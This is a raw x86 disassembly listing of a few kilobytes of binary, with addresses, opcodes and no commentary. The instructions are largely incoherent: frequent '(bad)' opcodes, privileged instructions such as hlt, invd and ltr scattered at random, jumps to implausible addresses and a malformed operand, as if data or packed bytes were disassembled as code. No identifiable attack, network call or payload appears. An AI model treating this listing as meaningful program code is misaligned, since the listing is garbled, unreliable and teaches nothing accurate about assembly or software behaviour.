  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
